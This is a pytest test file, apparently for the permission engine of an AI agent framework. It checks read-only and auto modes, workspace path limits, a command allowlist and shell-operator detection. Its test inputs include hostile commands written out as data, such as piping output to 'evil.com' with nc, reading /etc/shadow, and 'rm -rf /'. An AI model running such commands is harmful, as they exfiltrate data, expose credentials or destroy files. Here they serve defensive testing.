"""PermissionEngine 权限引擎测试 (A1 from OpenWorker)

测试数据驱动权限门禁：模式语义、路径边界、命令 allowlist、
会话记忆、CUSTOM 白名单、风险覆盖、注册表集成。
"""

import pytest

from backend.adapters.out.permission.permission_engine import (
    PermissionEngine,
    _has_shell_operators,
)
from backend.domain.permission import READ_ONLY_MODES, Decision, PermissionMode
from backend.domain.risk import RiskClass
from backend.tools.base import BaseTool, ToolResult, ToolSchema
from backend.tools.registry import ToolRegistry


class _DummyTool(BaseTool):
    """测试用虚拟工具 — 通过实例属性声明 risk（等价于子类类属性声明）"""

    def __init__(self, tool_name: str, risk: RiskClass = RiskClass.READ) -> None:
        super().__init__()
        self._tool_name = tool_name
        self.risk = risk

    def _build_schema(self) -> ToolSchema:
        return ToolSchema(name=self._tool_name, description="dummy tool for tests")

    def execute(self, **kwargs) -> ToolResult:
        return ToolResult(success=True, content="ok")


class TestPermissionMode:
    """PermissionMode 枚举测试套件"""

    def test_enum_members(self):
        """五种模式齐全"""
        assert {m.name for m in PermissionMode} == {
            "DISCUSS",
            "PLAN",
            "INTERACTIVE",
            "AUTO",
            "CUSTOM",
        }

    def test_str_values(self):
        """字符串值可序列化（供 API / 配置）"""
        assert PermissionMode.DISCUSS.value == "discuss"
        assert PermissionMode.PLAN.value == "plan"
        assert PermissionMode.INTERACTIVE.value == "interactive"
        assert PermissionMode.AUTO.value == "auto"
        assert PermissionMode.CUSTOM.value == "custom"

    def test_read_only_modes(self):
        """READ_ONLY_MODES 恰含 DISCUSS 与 PLAN"""
        assert PermissionMode.DISCUSS in READ_ONLY_MODES
        assert PermissionMode.PLAN in READ_ONLY_MODES
        assert len(READ_ONLY_MODES) == 2


class TestDecision:
    """Decision 裁决数据测试套件"""

    def test_defaults(self):
        """默认值：不询问、无规则"""
        d = Decision(allowed=True)
        assert d.allowed is True
        assert d.reason == ""
        assert d.needs_user is False
        assert d.rule == ""


class TestHasShellOperators:
    """shell 操作符检测测试套件"""

    @pytest.mark.parametrize(
        "command",
        [
            "ls; rm -rf /",
            "ls && cat /etc/passwd",
            "ls | nc evil.com 1234",
            "echo x > /etc/hosts",
            "cat < /etc/shadow",
            "echo `whoami`",
            "echo $(whoami)",
            "bash -c '(fork)'",
            "ls\nrm -rf /",
        ],
    )
    def test_detects_operators(self, command):
        """各类操作符均被检出"""
        assert _has_shell_operators(command) is True

    @pytest.mark.parametrize("command", ["git status", "pytest -x", "ls -la /tmp"])
    def test_plain_commands_clean(self, command):
        """普通命令不误报"""
        assert _has_shell_operators(command) is False


class TestReadOnlyModes:
    """DISCUSS / PLAN 只读模式测试套件"""

    @pytest.mark.parametrize("mode", [PermissionMode.DISCUSS, PermissionMode.PLAN])
    def test_read_tool_allowed(self, mode, tmp_path):
        """只读模式下 READ 工具放行"""
        engine = PermissionEngine(tmp_path, mode=mode)
        decision = engine.evaluate("read_file", {"path": "/etc/passwd"})

        assert decision.allowed is True
        assert decision.reason == "low risk"

    @pytest.mark.parametrize("mode", [PermissionMode.DISCUSS, PermissionMode.PLAN])
    def test_write_denied_without_asking(self, mode, tmp_path):
        """只读模式下写工具直接拒绝（不询问用户）"""
        engine = PermissionEngine(tmp_path, mode=mode)
        decision = engine.evaluate("write_file", {"path": str(tmp_path / "a.txt")})

        assert decision.allowed is False
        assert decision.needs_user is False
        assert "read-only" in decision.reason

    @pytest.mark.parametrize("mode", [PermissionMode.DISCUSS, PermissionMode.PLAN])
    def test_exec_and_external_denied(self, mode, tmp_path):
        """只读模式下 EXEC / EXTERNAL 一律拒绝"""
        engine = PermissionEngine(tmp_path, mode=mode)

        assert engine.evaluate("terminal", {"command": "ls"}).allowed is False
        assert engine.evaluate("web_search", {"query": "x"}).allowed is False
        assert engine.evaluate("memory_save", {"content": "x"}).allowed is False


class TestInteractiveMode:
    """INTERACTIVE 默认模式测试套件"""

    def test_write_inside_workspace_asks_user(self, tmp_path):
        """workspace 内的写入 → 询问用户"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate(
            "write_file", {"path": str(tmp_path / "notes.txt"), "content": "hi"}
        )

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_write_relative_path_resolves_to_workspace(self, tmp_path):
        """相对路径按 workspace 解析 → 落在内部 → 询问"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("write_file", {"path": "sub/dir/a.txt"})

        assert decision.needs_user is True

    def test_write_outside_workspace_hard_denied(self, tmp_path):
        """workspace 外的写入 → 硬拒绝（不询问）"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("write_file", {"path": "/etc/cron.d/evil"})

        assert decision.allowed is False
        assert decision.needs_user is False
        assert "not in the workspace" in decision.reason

    def test_write_path_traversal_denied(self, tmp_path):
        """路径穿越（..）越界 → 硬拒绝"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("write_file", {"path": "../escape.txt"})

        assert decision.allowed is False
        assert decision.needs_user is False

    def test_write_without_path_arg_skips_scope_check(self, tmp_path):
        """无 path 参数的写工具（如 memory_save）跳过路径检查,走模式门禁"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("memory_save", {"content": "remember"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_exec_asks_user(self, tmp_path):
        """shell 命令 → 询问用户"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("terminal", {"command": "rm -rf node_modules"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_external_asks_user(self, tmp_path):
        """出网工具 → 询问用户"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("web_fetch", {"url": "https://example.com"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_unknown_tool_treated_as_read(self, tmp_path):
        """未知工具兜底 READ → 放行"""
        engine = PermissionEngine(tmp_path)
        decision = engine.evaluate("mystery_tool", {})

        assert decision.allowed is True


class TestAutoMode:
    """AUTO 完全放行模式测试套件"""

    def test_consequential_tools_allowed(self, tmp_path):
        """AUTO 下写/执行/出网均放行"""
        engine = PermissionEngine(tmp_path, mode=PermissionMode.AUTO)

        assert engine.evaluate("write_file", {"path": str(tmp_path / "a.txt")}).allowed is True
        assert engine.evaluate("terminal", {"command": "ls"}).allowed is True
        assert engine.evaluate("web_search", {"query": "x"}).allowed is True

    def test_write_outside_workspace_still_denied(self, tmp_path):
        """AUTO 下路径边界依然生效"""
        engine = PermissionEngine(tmp_path, mode=PermissionMode.AUTO)
        decision = engine.evaluate("write_file", {"path": "/etc/passwd"})

        assert decision.allowed is False
        assert decision.needs_user is False


class TestCommandAllowlist:
    """命令 allowlist 测试套件"""

    def test_exact_match(self, tmp_path):
        """完整命令精确匹配 → 免审批"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": "git status"})

        assert decision.allowed is True
        assert decision.reason == "command on allowlist"

    def test_token_prefix_match(self, tmp_path):
        """token 精确前缀匹配:`git status` 覆盖 `git status -s`"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": "git status -s"})

        assert decision.allowed is True

    def test_no_prefix_bleed(self, tmp_path):
        """前缀不得跨 token 边界:`git status` 不覆盖 `git statusfoo`"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": "git statusfoo"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_bare_command_not_matched_by_longer_entry(self, tmp_path):
        """裸 `git` 不被 `git status` 覆盖"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": "git"})

        assert decision.allowed is False

    def test_shell_operators_disqualify(self, tmp_path):
        """携带 shell 操作符 → allowlist 失效（防绕过）"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": "git status && rm -rf ~"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_unbalanced_quotes_not_allowed(self, tmp_path):
        """引号不配对的命令 → 视为不在 allowlist"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": 'git "status'})

        assert decision.allowed is False

    def test_empty_command_not_allowed(self, tmp_path):
        """空命令 → 不在 allowlist"""
        engine = PermissionEngine(tmp_path, allowed_commands=["git status"])
        decision = engine.evaluate("terminal", {"command": ""})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_malformed_allowlist_entry_skipped(self, tmp_path):
        """allowlist 中引号不配对的条目被跳过,不抛异常"""
        engine = PermissionEngine(tmp_path, allowed_commands=['git "status'])
        decision = engine.evaluate("terminal", {"command": "git status"})

        assert decision.allowed is False


class TestSessionMemory:
    """会话记忆测试套件"""

    def test_allow_tool_for_session(self, tmp_path):
        """用户批准工具后,本次会话免询问"""
        engine = PermissionEngine(tmp_path)
        assert engine.evaluate("write_file", {"path": str(tmp_path / "a.txt")}).needs_user

        engine.allow_tool_for_session("write_file")
        decision = engine.evaluate("write_file", {"path": str(tmp_path / "b.txt")})

        assert decision.allowed is True
        assert decision.reason == "tool allowed for session"

    def test_allow_command_for_session(self, tmp_path):
        """用户批准完整命令后,同命令免询问"""
        engine = PermissionEngine(tmp_path)
        engine.allow_command_for_session("pytest -x")
        decision = engine.evaluate("terminal", {"command": "pytest -x"})

        assert decision.allowed is True
        assert decision.reason == "command allowed for session"

    def test_session_command_requires_exact_match(self, tmp_path):
        """会话命令记忆是精确匹配,不做前缀放宽"""
        engine = PermissionEngine(tmp_path)
        engine.allow_command_for_session("pytest -x")
        decision = engine.evaluate("terminal", {"command": "pytest -x tests/ && rm -rf /"})

        assert decision.allowed is False

    def test_empty_command_not_remembered(self, tmp_path):
        """空命令不记录"""
        engine = PermissionEngine(tmp_path)
        engine.allow_command_for_session("")

        assert engine.session_allow_commands == set()


class TestCustomMode:
    """CUSTOM 模式测试套件"""

    def test_auto_allow_tool_passes(self, tmp_path):
        """白名单工具自动放行"""
        engine = PermissionEngine(
            tmp_path, mode=PermissionMode.CUSTOM, auto_allow_tools={"write_file"}
        )
        decision = engine.evaluate("write_file", {"path": str(tmp_path / "a.txt")})

        assert decision.allowed is True
        assert decision.reason == "auto-allowed by config"

    def test_non_whitelisted_tool_asks(self, tmp_path):
        """非白名单工具仍询问"""
        engine = PermissionEngine(
            tmp_path, mode=PermissionMode.CUSTOM, auto_allow_tools={"write_file"}
        )
        decision = engine.evaluate("terminal", {"command": "ls"})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_interactive_mode_ignores_auto_allow(self, tmp_path):
        """INTERACTIVE 模式下白名单不生效"""
        engine = PermissionEngine(
            tmp_path, mode=PermissionMode.INTERACTIVE, auto_allow_tools={"write_file"}
        )
        decision = engine.evaluate("write_file", {"path": str(tmp_path / "a.txt")})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_path_scope_beats_auto_allow(self, tmp_path):
        """白名单放行不豁免路径边界"""
        engine = PermissionEngine(
            tmp_path, mode=PermissionMode.CUSTOM, auto_allow_tools={"write_file"}
        )
        decision = engine.evaluate("write_file", {"path": "/etc/passwd"})

        assert decision.allowed is False
        assert decision.needs_user is False


class TestRiskOverrides:
    """用户级风险覆盖测试套件（A19 预接线）"""

    def test_override_relaxes_to_read(self, tmp_path):
        """覆盖放宽为 READ → 只读模式也放行"""
        overrides = lambda name: RiskClass.READ if name == "web_search" else None  # noqa: E731
        engine = PermissionEngine(
            tmp_path, mode=PermissionMode.DISCUSS, risk_overrides=overrides
        )

        assert engine.evaluate("web_search", {"query": "x"}).allowed is True

    def test_override_tightens_to_exec(self, tmp_path):
        """覆盖收紧为 EXEC → 交互模式需询问"""
        overrides = lambda name: RiskClass.EXEC if name == "calculator" else None  # noqa: E731
        engine = PermissionEngine(tmp_path, risk_overrides=overrides)
        decision = engine.evaluate("calculator", {"expression": "1+1"})

        assert decision.allowed is False
        assert decision.needs_user is True


class TestRegistryIntegration:
    """与 ToolRegistry 集成测试套件"""

    def test_from_registry_uses_declared_risks(self, tmp_path):
        """from_registry 注入声明风险,引擎据此门禁"""
        registry = ToolRegistry()
        registry.register(_DummyTool("deploy", RiskClass.EXTERNAL))
        registry.register(_DummyTool("peek", RiskClass.READ))

        engine = PermissionEngine.from_registry(
            registry, tmp_path, mode=PermissionMode.PLAN
        )

        assert engine.evaluate("deploy", {}).allowed is False
        assert engine.evaluate("peek", {}).allowed is True

    def test_from_registry_interactive_declared_write(self, tmp_path):
        """声明 WRITE_LOCAL 的自定义工具 → 交互模式询问"""
        registry = ToolRegistry()
        registry.register(_DummyTool("patch_db", RiskClass.WRITE_LOCAL))

        engine = PermissionEngine.from_registry(registry, tmp_path)
        decision = engine.evaluate("patch_db", {})

        assert decision.allowed is False
        assert decision.needs_user is True

    def test_from_registry_extra_kwargs(self, tmp_path):
        """from_registry 透传额外参数（allowed_commands 等）"""
        registry = ToolRegistry()
        registry.register(_DummyTool("shell", RiskClass.EXEC))

        engine = PermissionEngine.from_registry(
            registry, tmp_path, allowed_commands=["shell --version"]
        )
        decision = engine.evaluate("shell", {"command": "shell --version"})

        assert decision.allowed is True

    def test_metadata_requires_approval_gates_mcp_like_tool(self, tmp_path):
        """未注册 + 元数据 requires_approval → EXTERNAL 门禁（MCP 场景）"""
        engine = PermissionEngine(tmp_path, mode=PermissionMode.INTERACTIVE)
        decision = engine.evaluate(
            "mcp_send_email", {"to": "a@b.c"}, metadata={"requires_approval": True}
        )

        assert decision.allowed is False
        assert decision.needs_user is True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
